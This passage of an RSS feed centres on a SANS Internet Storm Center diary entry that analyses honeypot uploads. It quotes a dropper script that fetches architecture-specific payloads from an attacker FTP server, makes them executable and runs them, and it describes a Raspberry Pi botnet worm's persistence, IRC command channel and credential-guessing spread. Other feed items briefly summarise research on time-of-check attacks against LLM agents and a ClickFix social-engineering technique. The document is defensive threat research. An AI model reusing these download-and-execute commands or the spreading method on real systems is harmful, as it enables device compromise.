-&lt;p&gt;The goal of this project is to test the suitability of various data entry points within the dshield ecosystem to determine which metrics are likely to yield consistently interesting results.&amp;nbsp; This article explores analysis of files uploaded to the cowrie honeypot server.&amp;nbsp; Throughout this project, a number of tools have been developed to aid in improving workflow efficiency for analysts conducting research using a cowrie honeypot.&amp;nbsp; Here, a relatively simple tool called &lt;strong&gt;upload-stats&lt;/strong&gt; is used to enumerate basic information about the files in the default cowrie &amp;lsquo;downloads&amp;rsquo; directory at /srv/cowrie/var/lib/cowrie/downloads.&amp;nbsp; This and other tools developed in this project are available for use or contribution at &lt;a href="https://github.com/neurohypophysis/dshield-tooling"&gt;https://github.com/neurohypophysis/dshield-tooling&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;The configuration of my honeypot is intentionally very typical, closely following the installation and setup guide on &lt;a href="https://github.com/DShield-ISC/dshield/tree/main"&gt;https://github.com/DShield-ISC/dshield/tree/main&lt;/a&gt;.&amp;nbsp; The node in use for the purposes of this article is was set up on an EC2 instance in the AWS us-east-1 zone, which is old and very large, even by AWS standards.&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Part 1: Identified Shell Script Investigation&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The upload-stats tool works by enumerating some basic information about the files present in the downloads directory and printing it along with any corresponding information discovered in the honeypot event logs.&amp;nbsp; If the logs are still present on the system, it will automatically identify information such as source IP, time of upload, and other statistics that can aid in further exploration of interesting-looking files.&lt;br /&gt;
-Given no arguments, the tool produces a quick summary of the files available on the system:&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic1.png" style="width: 499px; height: 232px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;In this case, 21 of the files are reported as empty; if you&amp;rsquo;re following along, you may notice that the names of many such empty files are something short like tmp5wtvcehx.&amp;nbsp; When an upload is started, cowrie creates a temporary file, populates it with the contents of the uploaded file, and then renames it to the SHA hash of the result.&amp;nbsp; For empty files with temporary placeholder names, that likely means that the upload failed for some reason.&lt;/p&gt;
-
-&lt;p&gt;Among the top file types provided, we have a single file that was identified by the UNIX file utility as a Bash script.&amp;nbsp; As it turns out, this was not the only shell script among the files present in the directory at the time this command was run.&amp;nbsp; The reason that only one of them was identified as a shell script will be explored later in this article.&amp;nbsp; First, let&amp;rsquo;s take a look at the outlier.&amp;nbsp; Luckily it&amp;rsquo;s relatively short, so I can include the contents of the entire script here.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic2.png" style="width: 802px; height: 733px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;Fortunately for us, this script is very repetitive and easy to read, so let&amp;rsquo;s go line by line for one iteration of the pattern (which, I might add, could be much more concise had the actor used a for loop).&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Line 1&lt;/strong&gt;&lt;br /&gt;
-&lt;span style="font-family: Courier New,Courier,monospace;"&gt;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Each line of the script begins by attempting to change to several directories (cd /tmp || cd /var/run || cd /mnt || cd /root || cd /). This fallback sequence suggests a preference for a writable, low-monitoring location first (/tmp) and will attempt alternative directories only if prior ones fail, with the file root as a last resort.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Line 2&lt;/strong&gt;&lt;br /&gt;
-&lt;span style="font-family: Courier New,Courier,monospace;"&gt;ftpget -v -u anonymous -p anonymous -P 21 87.121.84.163 arm5 arm5;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-What follows is a command to download an architecture-specific payload from the actor&amp;rsquo;s FTP server.&amp;nbsp; More specifically, the script as a whole, if executed (and assuming we have ftpget installed, which we do not) will download payloads for 14 different architectures, casting a pretty wide net.&amp;nbsp; The inclusion of the -v (verbose) switch indicates that the actor expects, or at least hopes for non-blind RCE in this context, though we can assume FTP server accesses from the victim would be visible to the actor if execution succeeded, regardless.&lt;/p&gt;
-
-&lt;p&gt;To be thorough, here are the targeted CPU architecture variants:&lt;br /&gt;
-&amp;bull;&amp;nbsp; &amp;nbsp; mips, mipsel (MIPS variants)&lt;br /&gt;
-&amp;bull;&amp;nbsp; &amp;nbsp; sh4 (SuperH architecture)&lt;br /&gt;
-&amp;bull;&amp;nbsp; &amp;nbsp; x86_64 (64-bit Intel/AMD)&lt;br /&gt;
-&amp;bull;&amp;nbsp; &amp;nbsp; arm6, arm, arm5, arm7 (various ARM versions)&lt;br /&gt;
-&amp;bull;&amp;nbsp; &amp;nbsp; i686, x86 (32-bit Intel/AMD)&lt;br /&gt;
-&amp;bull;&amp;nbsp; &amp;nbsp; powerpc, ppc4fp (PowerPC variants)&lt;br /&gt;
-&amp;bull;&amp;nbsp; &amp;nbsp; m68k (Motorola 68k series)&lt;br /&gt;
-&amp;bull;&amp;nbsp; &amp;nbsp; spc (Ambiguous; may refer to SPC-700, among others.&amp;nbsp; I&amp;rsquo;d have to ask the author of the malware for clarification)&lt;/p&gt;
-
-&lt;p&gt;An interesting list, to be sure.&amp;nbsp; After researching some of the more obscure variants, the underlying commonality seems to be targeting IoT/embedded/OT devices or (likely legacy) networking equipment.&amp;nbsp; It&amp;rsquo;s hard to say anything beyond that for certain, though many of these have much more limited applications than others (e.g., SuperH, Motorola 68000 series, and SPC vs x86_64).&amp;nbsp; Notably absent are any Apple chips or many of the modern chips used in Android handsets.&amp;nbsp; Given the types of devices used with some of these specialized hardware sets, the final payload is unlikely to attempt anything involving a heavy workload.&lt;br /&gt;
-I also noted the use of the old plaintext FTP for payload transfer: old becomes new again.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Line 3&lt;/strong&gt;&lt;br /&gt;
-&lt;span style="font-family: Courier New,Courier,monospace;"&gt;chmod 777 arm5 ./arm5 telnet&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;This step changes the permissions of the downloaded payload to executable and then executes it with the argument &amp;lsquo;telnet&amp;rsquo;, which I&amp;rsquo;m guessing indicates the intended backdoor method.&amp;nbsp; Note that the script as received will attempt to execute all of the downloaded payloads, meaning that any environment discovery likely happens at this step, and only the payload corresponding to the compromised host&amp;rsquo;s chip architecture will successfully execute.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Line 4&lt;/strong&gt;&lt;br /&gt;
-&lt;span style="font-family: Courier New,Courier,monospace;"&gt;rm -rf arm5&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Finally, the payload is removed, possibly indicating that a persistence mechanism has been installed with the previous step, and more obviously indicating a desire to leave slightly fewer forensic artifacts on the target system.&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Second-Stage Payload Server Analysis&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The address 87.121.84.163 did not appear in any of the other uploaded files.&amp;nbsp; It appeared in several IP reputation blocklists as reported by Speedguide and Talos, though the referenced database at spamhaus.org did not return any immediately visible results.&amp;nbsp; At any rate, the RIPE records have the /24 netblock registered to an AS owned by a Dutch VPS provider, VPSVAULTHOST, which looks like it&amp;rsquo;s operating in the UK.&amp;nbsp; I&amp;rsquo;m assuming it&amp;rsquo;s a cloud-hosted server.&amp;nbsp; Interestingly, the ISC page has the country listed as Bulgaria, though I didn&amp;rsquo;t see anything else pointing there in my search.&amp;nbsp; Nothing else is reported on the ISC website.&lt;/p&gt;
-
-&lt;p&gt;Unfortunately, I have no other records of the source of this attack directly.&amp;nbsp; 87.121.84.163 also did not appear in any other records, which is expected considering its role in the attack as a payload server.&amp;nbsp; In the next section, we will see instances of honeypot uploads with associated log entries, allowing for a more complete picture of an attack origin and life cycle.&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Part 2: Botnet Worm Discovery&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Continuing the investigation of patterns in uploaded files, I noticed that all of the file types identified by the system as &amp;lsquo;data&amp;rsquo; appear to be readable text.&amp;nbsp; In the earlier bash script analysis, I noted that the file in question was not the only shell script present.&amp;nbsp; That is, it was not the only file containing a shebang (!#/bin/bash).&amp;nbsp; Moreover, file permissions that may have permitted identification of a shell script as such (i.e., 644 &amp;ndash; readable by users other than root) were not unique to this file.&amp;nbsp; In fact, all of the &amp;lsquo;data&amp;rsquo; files were not only readable but also consistently contained the string &amp;lsquo;bin/bash&amp;rsquo;.&amp;nbsp; In the following command, I filter for file types matching &amp;lsquo;data&amp;rsquo; and containing &amp;lsquo;bin/bash&amp;rsquo;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic3.png" style="width: 499px; height: 409px;" /&gt;&lt;br /&gt;
-&lt;strong&gt;Note&lt;/strong&gt;: &lt;em&gt;Many of the files have no corresponding &amp;lsquo;metadata&amp;rsquo; because the log records associated with these files have aged off of the system, but the files themselves have not.&amp;nbsp; Also, there are more total files in this screenshot because the timeline of this investigation was not perfectly linear.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;In the previous screenshot we saw that our query for data files containing the bash interpreter path returned six matches.&amp;nbsp; Re-running the tool with no arguments, it appears that these six files account for 100% of our files of type &amp;lsquo;data&amp;rsquo;.&amp;nbsp; Looking at the other file types, the readability was either self-explanatory (ASCII, Unicode, shell script, empty) or inconsistent (some &amp;lsquo;regular files&amp;rsquo; were binary while others were text-based).&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic4.png" style="width: 498px; height: 119px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;The reason behind the variance in assigned permissions (either 0600 or 0644 for all files in the directory) has to do with the source of the activity from cowrie&amp;rsquo;s perspective.&amp;nbsp; A look at cowrie&amp;rsquo;s VFS (virtual file system) templates in fs.pickle would likely reveal the specifics of how these permissions are assigned, but for our purposes that&amp;rsquo;s not necessary at the moment.&amp;nbsp; To gain a general sense for the provenance of different file types on the system, we can start by examining the behavioral patterns associated with IPs that uploaded files of different types.&amp;nbsp; To set a baseline, I used another tool, &lt;span style="font-family: Courier New,Courier,monospace;"&gt;ip-activity&lt;/span&gt;, to aggregate all of the log events associated with addresses that uploaded &amp;lsquo;regular&amp;rsquo; files.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic5.png" style="width: 499px; height: 188px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;Luckily not all of the logs related to these files have yet aged off.&amp;nbsp; This collection of data should reveal any consistencies in the context behind how these files were uploaded, which indeed it does.&amp;nbsp; For all files labeled as &amp;lsquo;regular&amp;rsquo;, the actor makes several login attempts, succeeds, and then uploads a file via SFTP.&amp;nbsp; With that knowledge, activity patterns related to &amp;lsquo;data&amp;rsquo; files should stand out.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic6.png" style="width: 499px; height: 232px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;As hoped, this pattern is also consistent: for files marked &amp;lsquo;data&amp;rsquo;, the source came from stdin during an active SSH session.&amp;nbsp; That is, for these files the actor interacted with the system during an authenticated session before and/or after pushing a payload onto it, for 81.172.146.181 and 176.188.22.163 at the very least.&amp;nbsp; Once verified, this type of information will be useful to include in the output for later editions of the upload-stats tool.&lt;/p&gt;
-
-&lt;p&gt;While looking over the activity for these two addresses, the login attempts caught my eye.&amp;nbsp; Both clients attempted pi/raspberry and pi/raspberryraspberry993311.&amp;nbsp; Obviously enough they&amp;rsquo;re both looking for RBP devices in this case, but raspberryraspberry993311 is a rather specific guess, considering that it was the second of only two guesses from two (to our current knowledge) independent hosts.&amp;nbsp; To me, that indicates this password is probably not a random guess from a brute-forcing attempt.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic7.png" style="width: 499px; height: 107px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;A bit of research into &amp;lsquo;raspberryraspberry993311&amp;rsquo; revealed a specific botnet malware strain associated with Pi IoT devices identified as UNIX_PIMINE.A by Trend Micro.&amp;nbsp; The 2019 article linked below features a through analysis of the malware that I will compare with the activity captured on my device.&lt;/p&gt;
-
-&lt;p&gt;https://www.researchgate.net/profile/Joakim-Kargaard-2/publication/334704944_Raspberry_Pi_Malware_An_Analysis_of_Cyberattacks_Towards_IoT_Devices/links/5e6f86ea458515e555803389/Raspberry-Pi-Malware-An-Analysis-of-Cyberattacks-Towards-IoT-Devices.pdf&lt;/p&gt;
-
-&lt;p&gt;To start, let&amp;rsquo;s compare the commands that followed successful authentication to the honeypot.&amp;nbsp; From my output, each command was saved to a separate tty logfile, so unfortunately the venerable &lt;strong&gt;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;playlog.py&lt;/span&gt;&lt;/strong&gt; is not especially useful in this case.&amp;nbsp; However, we can still extract the command events directly from the logs, which I did.&amp;nbsp; For those not aware, playlog.py is a tool created by Upi Tamminen (desaster@dragonlight.fi) that parses cowrie TTY logs (saved in &lt;span style="font-family: Courier New,Courier,monospace;"&gt;/srv/cowrie/var/lib/cowrie/tty/&lt;/span&gt;) and allows analysts to replay the activity in real time.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic8.png" style="width: 499px; height: 56px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;Both of our actors immediately pull a file to /tmp using scp, then set its permissions to executable and run it.&amp;nbsp; So far this is exactly aligned with the activity described in the UNIX_PIMINE.A article.&amp;nbsp; Next I will examine the files uploaded to see if they also follow the same path, where they may differ, and whether they appear to be members of the same botnet channel.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic9.png" style="width: 278px; height: 202px;" /&gt;&lt;br /&gt;
-Screenshot from the researchgate.net article referenced above&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Static Malware Analysis:&amp;nbsp; UNIX_PIMINE.A&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Comparing the two samples uploaded by 81.172.146.181 and 176.188.22.163, the only difference between them is an scp control message prepended to the top of the files: &lt;strong&gt;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;C0755 4745 ocM8dVVu&lt;/span&gt;&lt;/strong&gt; and&lt;span style="font-family: Courier New,Courier,monospace;"&gt;&lt;strong&gt; C0755 4745 komDY9Nv&lt;/strong&gt;&lt;/span&gt;, respectively.&amp;nbsp; To take the latter example, this control message breaks out to &amp;lsquo;copy file komDY9Nv of size 4745 with permissions 0755.&amp;rsquo;&amp;nbsp; As a side, the presence of control messages at the top of the files uploaded from stdin likely explains why the &amp;lsquo;data&amp;rsquo; files are not marked as shell scripts.&amp;nbsp; In addition, a null byte at the end of the files may explain why they are classified as &amp;lsquo;data&amp;rsquo; rather than ASCII text.&lt;/p&gt;
-
-&lt;p&gt;Before continuing analysis of the scripts associated with just these two addresses, you may have noticed in the earlier enumeration of &amp;lsquo;data&amp;rsquo; files that the sizes of the remaining files for which we lack log data appear to be identical.&amp;nbsp; Running &lt;span style="font-family: Courier New,Courier,monospace;"&gt;vimdiff&lt;/span&gt; against the remaining files confirms that our other 4 data file records are instances of attacks from members of the same botnet.&amp;nbsp; Continuing down the code, everything appears to align with the description given in the referenced article.&amp;nbsp; The malware makes a copy of itself to a file with a random 8-digit name within /opt, modifies /etc/local.rc to execute the backdoor on reboot, and then instructs the system to do just that.&lt;/p&gt;
-
-&lt;p&gt;After that, the malware attempts to kill and remove a number of other (apparent) cryptomining plants that may already exist on the compromised system, before connecting out to an Undernet Internet Relay Chat (IRC) channel on port 6667, where it joins the #biret C2 channel with an username based on the md5 hash of the compromised system&amp;rsquo;s &lt;span style="font-family: Courier New,Courier,monospace;"&gt;uname&lt;/span&gt; output.&amp;nbsp; As pointed out in the article, this is a fairly low-entropy generation scheme for unique usernames, since the probability of multiple systems with identical output for &amp;lsquo;uname -a&amp;rsquo; is very high, leading to username collisions and ultimately limiting the worm&amp;rsquo;s growth factor.&amp;nbsp; I suspected channel rotation might have occurred since the article was published, but the instances that hit my machine were in fact from members of the same botnet from 2019.&amp;nbsp; Malware that endlessly replicates itself independently of its originator, as it turns out, is pretty hard to patch.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic10.png" style="width: 323px; height: 192px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;The worm&amp;rsquo;s spreading mechanism involves the installation of &lt;span style="font-family: Courier New,Courier,monospace;"&gt;sshpass&lt;/span&gt; for simplifying ssh-based connections to new targets and &lt;span style="font-family: Courier New,Courier,monospace;"&gt;Zmap&lt;/span&gt; for port scanning.&amp;nbsp; Specifically, it scans IPs (iterating 100,000 addresses at a time) for port 22 availability and stores reachable addresses in a temporary file before trying its 2 credential sets: pi/raspberry and pi/raspberryraspberry993311.&amp;nbsp; The password &amp;lsquo;raspberry&amp;rsquo; is a long-running default for Pi devices.&amp;nbsp; However, at this point it&amp;rsquo;s still not entirely clear why this second combination is used in particular; it is strongly correlated with various pi-related attacks, but does not seem to be a common default password as far as I have been able to discover.&amp;nbsp; It&amp;rsquo;s possible that some other malware variants (such as those this worm attempts to remove) create an account on compromised hosts with these credentials, leading to an increased likelihood of successful authentication for the types of devices this worm looks to infect.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic11.png" style="width: 499px; height: 97px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Source Address Consideration: Compromised Pies&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Knowing what we do about the way this malware spreads, the session activity is pretty clear.&amp;nbsp; It&amp;rsquo;s best to think of the actor addresses in this case as two compromised victims of the same worm; i.e., members of the same botnet.&amp;nbsp; From the two sets of logs we have at hand, 81.172.146.181 appears to be a Dutch ISP-assigned public address within a network belonging to DELTA Fiber Nederland B.V.&amp;nbsp; My guess would be that this is a network/IoT appliance or possibly an RBP positioned behind a SOHO gateway router with port forwarding, based on what we&amp;rsquo;ve seen so far.&amp;nbsp; 176.188.22.163 is a similar story: in this case, belonging to a French ISP (Bouygues Telecom).&amp;nbsp; No malicious activity has been reported for either address on the ISC website.&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Conclusion: File Uploads and Attack Descriptions&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
-&lt;br /&gt;
-Correlation of event logs to files uploaded to the honeypot has proved effective for discovering highly specific attack patterns.&amp;nbsp; Moreover, context surrounding the operating internals of the cowrie (or other honeypot) environment is crucial for understanding the chronology and substance of an event.&amp;nbsp; Automating processes such as event correlation and the ability to group files, IPs, and other information into discrete buckets greatly reduces the overhead required for such investigations and encourages analytic insights.&amp;nbsp; A disadvantage to this approach is that the scope of activity relative to the volume of events not logged in file uploads is very small, though depending on the intent of an investigation, this may not be a problem.&lt;/p&gt;
-
-&lt;p&gt;The attacks observed in this article highlight the need primarily for maintenance and monitoring of legacy systems, as well as the necessity of changing default passwords before exposing systems to the public Internet.&lt;/p&gt;
-
-&lt;p&gt;[1] https://github.com/neurohypophysis/dshield-tooling&lt;br /&gt;
-[2] https://github.com/DShield-ISC/dshield/tree/main&lt;br /&gt;
-[3] https://www.sans.edu/cyber-security-programs/bachelors-degree/&lt;/p&gt;
-
-&lt;p&gt;-----------&lt;br /&gt;
-Guy Bruneau &lt;a href="http://www.ipss.ca/"&gt;IPSS Inc.&lt;/a&gt;&lt;br /&gt;
-&lt;a href="https://github.com/bruneaug/"&gt;My GitHub Page&lt;/a&gt;&lt;br /&gt;
-Twitter: &lt;a href="https://twitter.com/guybruneau"&gt;GuyBruneau&lt;/a&gt;&lt;br /&gt;
-gbruneau at isc dot sans dot edu&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32296</guid></item><item><title>What We Know About the NPM Supply Chain Attack</title><link>https://www.trendmicro.com/en_us/research/25/i/npm-supply-chain-attack.html</link><description>Trend™ Research outlines the critical details behind the ongoing NPM supply chain attack and offers essential steps to stay protected against potential compromise.</description><guid isPermaLink="false">urn:uuid:e5966f02-025b-05ca-9a43-07d364f2239a</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>Trump’s UK Visit: OpenAI, Nvidia, and Other US Firms Commit Billions for Data Centers</title><link>https://www.techrepublic.com/article/news-uk-data-center-delegation/</link><description>&lt;p&gt;OpenAI’s Stargate project reaches over the Atlantic as Trump and Starmer announce AI infrastructure agreement. &lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-nvidia-china-ban/"&gt;Huang ‘Disappointed’ as Chinese Government Restricts Use of Nvidia AI Chips&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4327763</guid><category>APAC</category><category>Artificial Intelligence</category><category>Hardware</category><category>International</category><category>News</category></item><item><title>ISC Stormcast For Thursday, September 18th, 2025 https://isc.sans.edu/podcastdetail/9618, (Thu, Sep 18th)</title><link>https://isc.sans.edu/diary/rss/32298</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32298</guid></item><item><title>What We Know About the NPM Supply Chain Attack</title><link>https://www.trendmicro.com/en_us/research/25/i/npm-supply-chain-attack.html</link><description>Trend™ Research outlines the critical details behind the ongoing NPM supply chain attack and offers essential steps to stay protected against potential compromise.</description><guid isPermaLink="false">urn:uuid:e5966f02-025b-05ca-9a43-07d364f2239a</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>Trump’s UK Visit: OpenAI, Nvidia, and Other US Firms Commit Billions for Data Centers</title><link>https://www.techrepublic.com/article/news-uk-data-center-delegation/</link><description>&lt;p&gt;OpenAI’s Stargate project reaches over the Atlantic as Trump and Starmer announce AI infrastructure agreement. &lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-uk-data-center-delegation/"&gt;Trump’s UK Visit: OpenAI, Nvidia, and Other US Firms Commit Billions for Data Centers&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4327708</guid><category>Artificial Intelligence</category><category>Data Centers</category><category>Hardware</category><category>International</category><category>News</category><category>United Kingdom</category></item><item><title>Microsoft Commits Record $30 Billion to UK’s AI Infrastructure Expansion</title><link>https://www.techrepublic.com/article/news-microsoft-uk-investment-ai-infrastructure/</link><description>&lt;p&gt;Microsoft is investing $15B in UK AI and cloud, expanding data centers, Nvidia-powered supercomputers, and workforce to boost AI skills and innovation.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-microsoft-uk-investment-ai-infrastructure/"&gt;Microsoft Commits Record $30 Billion to UK’s AI Infrastructure Expansion&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4327673</guid><category>Artificial Intelligence</category><category>Cloud</category><category>Data Centers</category><category>Innovation</category><category>International</category><category>Microsoft</category><category>News</category><category>Tech &amp; Work</category><category>United Kingdom</category></item><item><title>Time-of-Check Time-of-Use Attacks Against LLMs</title><link>https://www.schneier.com/blog/archives/2025/09/time-of-check-time-of-use-attacks-against-llms.html</link><description>&lt;p&gt;This is a nice piece of research: &amp;#8220;&lt;a href="https://arxiv.org/abs/2508.17155"&gt;Mind the Gap: Time-of-Check to Time-of-Use Vulnerabilities in LLM-Enabled Agents&lt;/a&gt;&amp;#8220;.:&lt;/p&gt;
 &lt;blockquote&gt;&lt;p&gt;&lt;b&gt;Abstract:&lt;/b&gt; Large Language Model (LLM)-enabled agents are rapidly emerging across a wide range of applications, but their deployment introduces vulnerabilities with security implications. While prior work has examined prompt-based attacks (e.g., prompt injection) and data-oriented threats (e.g., data exfiltration), time-of-check to time-of-use (TOCTOU) remain largely unexplored in this context. TOCTOU arises when an agent validates external state (e.g., a file or API response) that is later modified before use, enabling practical attacks such as malicious configuration swaps or payload injection. In this work, we present the first study of TOCTOU vulnerabilities in LLM-enabled agents. We introduce TOCTOU-Bench, a benchmark with 66 realistic user tasks designed to evaluate this class of vulnerabilities. As countermeasures, we adapt detection and mitigation techniques from systems security to this setting and propose prompt rewriting, state integrity monitoring, and tool-fusing. Our study highlights challenges unique to agentic workflows, where we achieve up to 25% detection accuracy using automated detection methods, a 3% decrease in vulnerable plan generation, and a 95% reduction in the attack window. When combining all three approaches, we reduce the TOCTOU vulnerabilities from an executed trajectory from 12% to 8%. Our findings open a new research direction at the intersection of AI safety and systems security...&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded>&lt;p&gt;This is a nice piece of research: &amp;#8220;&lt;a href="https://arxiv.org/abs/2508.17155"&gt;Mind the Gap: Time-of-Check to Time-of-Use Vulnerabilities in LLM-Enabled Agents&lt;/a&gt;&amp;#8220;.:&lt;/p&gt;
@@ -12376,1042 +12792,7 @@ attributed to UAC-0057 (aka GhostWriter). These campaigns delivered a weaponized
 &lt;div class="OutlineElement Ltr SCXW251838431 BCX8"&gt;
 &lt;p&gt;&amp;nbsp;Stakeholders are encouraged to provide feedback via the &lt;a href="https://www.federalregister.gov/documents/2025/08/22/2025-16147/request-for-comment-on-2025-minimum-elements-for-a-software-bill-of-materials"&gt;Federal Register&lt;/a&gt; during the public comment period. This feedback will contribute to refining SBOM practices, enabling CISA to release an updated version of the minimum elements.&amp;nbsp;&lt;br /&gt;&amp;nbsp;&lt;/p&gt;
 &lt;/div&gt;</description><guid isPermaLink="false">/node/23825</guid></item><item><title>Encryption Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/encryption-policy/</link><description>&lt;p&gt;This policy provides guidelines for adopting encryption technologies for organizational use. Customizable Document — Use it as-is or make minor edits. Boost Your Security — This six-page document can provide peace of mind that communications will not be intercepted and that sensitive information stored on devices can’t be exfiltrated in the event of loss or ...&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/resource-library/it-policy/encryption-policy/"&gt;Encryption Policy&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/encryption-policy/</guid><category>Cybersecurity</category><category>Data</category><category>IT Resources</category></item><item><title>Leadership, Innovation, and the Future of AI: Lessons from Trend Micro CEO &amp; Co-Founder Eva Chen</title><link>https://www.trendmicro.com/en_us/research/25/h/eva-chen-future-of-ai.html</link><description>Discover how AI is reshaping cybersecurity through our CEO, Eva Chen’s industry briefing series. Gain practical strategies, real-world insights, and a clear roadmap to secure your AI initiatives with confidence.</description><guid isPermaLink="false">urn:uuid:69512dc3-1504-89b3-bc4e-3f1b8976d44e</guid><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Expert Perspective</category></item><item><title>Think before you Click(Fix): Analyzing the ClickFix social engineering technique</title><link>https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/</link><description>&lt;p&gt;The ClickFix social engineering technique has been growing in popularity, with campaigns targeting thousands of enterprise and end-user devices daily. This technique exploits users’ tendency to resolve technical issues by tricking them into running malicious commands. These commands, in turn, deliver payloads that ultimately lead to information theft and exfiltration.&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/"&gt;Think before you Click(Fix): Analyzing the ClickFix social engineering technique&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p class="wp-block-paragraph"&gt;Over the past year, Microsoft Threat Intelligence and &lt;a href="https://www.microsoft.com/en-us/security/business/services/microsoft-defender-experts-xdr"&gt;Microsoft Defender Experts&lt;/a&gt; have observed the ClickFix social engineering technique growing in popularity, with campaigns targeting thousands of enterprise and end-user devices globally every day. Since early 2024, we’ve helped multiple customers across various industries address such campaigns attempting to deliver payloads like the prolific &lt;a 